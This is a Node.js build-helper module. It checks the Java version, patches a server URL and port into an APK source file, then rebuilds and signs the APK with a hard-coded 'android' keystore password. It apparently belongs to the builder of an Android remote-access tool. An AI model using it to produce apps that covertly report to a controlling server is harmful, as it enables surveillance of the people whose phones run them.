const
    cp = require('child_process'),
    fs = require('fs'),
    CONST = require('./const');

// Thanks -> https://stackoverflow.com/a/19734810/7594368
// This function is a pain in the arse, so many issues because of it! -- hopefully this fix, fixes it!
function javaversion(callback) {
    let spawn = cp.spawn('java', ['-version']);
    let output = "";
    spawn.on('error', (err) => callback("Unable to spawn Java - " + err, null));
    spawn.stderr.on('data', (data) => {
        output += data.toString();
    });
    spawn.on('close', function (code) {
        let versionStr = "";
        let javaIndex = output.indexOf('java version');
        let openJDKIndex = output.indexOf('openjdk version');
        if (javaIndex !== -1) versionStr = output.substring(javaIndex, (javaIndex + 27));
        else if (openJDKIndex !== -1) versionStr = output.substring(openJDKIndex, (openJDKIndex + 27));
        if (versionStr === "") return callback("Java Not Installed", undefined);
        let match = versionStr.match(/(\d+)\.(\d+)/);
        if (match) {
            let major = parseInt(match[1]);
            let minor = parseInt(match[2]);
            // Java 8 reports as 1.8, Java 9+ reports as major.minor (e.g. 11.0, 17.0, 25.0)
            let isJava8 = (major === 1 && minor === 8);
            let isJava9OrLater = (major >= 9);
            if (isJava8 || isJava9OrLater) {
                spawn.removeAllListeners();
                spawn.stderr.removeAllListeners();
                return callback(null, versionStr);
            }
        }
        return callback("Wrong Java Version Installed. Detected " + versionStr + ". Please use Java 8 or later", undefined);
    });
}

function patchAPK(URI, PORT, cb) {
    if (PORT < 25565) {
        fs.readFile(CONST.patchFilePath, 'utf8', function (err, data) {
            if (err) return cb('File Patch Error - READ')
            var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + URI + ":" + PORT);
            fs.writeFile(CONST.patchFilePath, result, 'utf8', function (err) {
                if (err) return cb('File Patch Error - WRITE')
                else return cb(false)
            });
        });
    }
}

function signAPK(cb) {
    cp.exec('which apksigner', (err) => {
        if (!err) {
            let cmd = 'apksigner sign --ks "' + CONST.apkKeystore + '" --ks-pass pass:android --key-pass pass:android --out "' + CONST.apkSignedBuildPath + '" "' + CONST.apkBuildPath + '"';
            cp.exec(cmd, (error, stdout, stderr) => {
                if (!error) return cb(false);
                else return cb('Apksigner Failed - ' + error.message);
            });
        } else {
            cp.exec(CONST.signCommand, (error, stdout, stderr) => {
                if (!error) return cb(false);
                else return cb('Sign Command Failed - ' + error.message);
            });
        }
    });
}

function buildAPK(cb) {
    javaversion(function (err, version) {
        if (!err) cp.exec(CONST.buildCommand, (error, stdout, stderr) => {
            if (error) return cb('Build Command Failed - ' + error.message);
            else signAPK(cb);
        });
        else return cb(err);
    })
}

module.exports = {
    buildAPK,
    patchAPK
}
